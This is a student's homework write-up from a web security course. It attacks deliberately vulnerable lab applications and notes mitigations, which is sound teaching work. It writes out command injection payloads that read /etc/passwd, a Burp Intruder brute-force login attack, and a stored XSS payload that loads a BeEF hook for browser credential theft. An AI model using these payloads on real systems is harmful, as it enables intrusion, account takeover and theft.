### Week 15 Homework: Web Vulnerabilities and Hardening Homework

#### Web Application 1: *Your Wish is My Command Injection*

Access Vagrant and open a browser.

Launch Vagrant from GitBash and run the following command:

`cd ./Documents/web-vulns && docker-compose up`

Leave this page open and continue to the next step.

Open Chrome, navigate to the following web page:

`http://192.168.13.25`

Log in with the following credentials:

- User name: `admin`
- Password: `password`

Select the `Command Injection` option from the left menus.

Using the dot-dot-slash `../` method five times to design two payloads that will display the contents of the following files:

- `/etc/passwd`

	`8.8.8.8 && cat ../../../../../etc/passwd`
![cat ../../../../../etc/passwd](https://github.com/zwang21/Week-15-Homework/blob/main/images/passwd.png "cat ../../../../../etc/passwd")

- `/etc/hosts`

	`8.8.8.8 && cat ../../../../../etc/hosts`
![cat ../../../../../etc/hosts](https://github.com/zwang21/Week-15-Homework/blob/main/images/hosts.png "cat ../../../../../etc/hosts")

**Recommended mitigation strategies:**

- Server-side validation that does not allow selection of unintended files.â€‹
- Segregation of confidential files from the web server and accessible directories.
- Permissions to restrict web server account accessibility.

#### Web Application 2: *A Brute Force to Be Reckoned With*

Run this command `sudo burpsuite` in Vagrant command line.

Open Firefox which was already installed `FoxyProxy` add-on extension in class activities.

In Burpsuite, I got following intercept data:

```
Request to http://192.168.13.35:80
```
```
POST /ba_insecure_login_1.php HTTP/1.1

```

![Proxy Intercept results](https://github.com/zwang21/Week-15-Homework/blob/main/images/intercept.png)

- Send above Proxy intercept results to Intruder. Click `Intruder` tab;
- Verify `Target`;

![Intruder Target](https://github.com/zwang21/Week-15-Homework/blob/main/images/intruder-target.png)

- Setup `Positions`, select attack type `Cluster bomb`; 
- Configure and add `login` and `password` as positions.

![Intruder Positions](https://github.com/zwang21/Week-15-Homework/blob/main/images/intruder-positions.png) 

- Click `Payloads` tab, choose `Payload` type as `Simple list`;
- Add login user ID from `List of Administrators` file into Payload set 1;
- Add password from `Breached list of Passwords` file into Payload set 2;

![Intruder Payloads](https://github.com/zwang21/Week-15-Homework/blob/main/images/intruder-payloads.png)
 
- Click `Start attack`
 
After analysis of intruder attack results, the login username/password combination of "**`tonystark`**" and "**`I am Iron Man`**" did result in a successful login. The page displays `Successful login! You really are Iron Man :)`.

Recommended mitigation strategies:

- Mitigations can include requiring complex usernames and passwords, using multi-factored authentication, and enabling a lockout after a certain amount of failed login attempts.

#### Web Application 3: *Where's the BeEF?*

**Step 1, Prepare Replicants website**

Inside Vagrant, go to this folder, run command:
`~/Documents/web-vulns$ docker-compose up`

Go to this website:
`http://192.168.13.25/vulnerabilities/xss_s/`

Reset db and login again.
Username: `admin`
Password: `password`

**Step 2, Setup BeEF**

On Vagrant, open a command line and run the following command: `sudo beef`

When prompted for a password, enter `cybersecurity`.

To access the BeEF GUI, right-click the first URL `UI_URL: http://127.0.0.1:3000/ui/panel` and select Open Link.

When the BeEF webpage opens, login with the following credentials:

Username: `beef`
Password: `feeb`

**Step 3, Find BeEF hook and write payload**

```
BeEF hook: http://127.0.0.1:3000/hook.js

Playload: <script src="http://127.0.0.1:3000/hook.js"></script>
```

**Step 4, Inject this payload**

One issue was found: in the message box field, there only has maxlength="50" in original source code, therefore we can not input the whole payload code.
![](https://github.com/zwang21/Week-15-Homework/blob/main/images/maxlength-50.png)

Solution: Right-clicking on web page and selecting "Inspecting the Element". Change as `maxlength="100"`, or just delete this code limit.

**Step 5, A couple BeEF exploits**

Social Engineering >> Pretty Theft

Social Engineering >> Fake Notification Bar

Host >> Get Geolocation (Third Party)

#### Recommended mitigation strategies

- Input validation is a common method used to mitigate cross-site scripting.
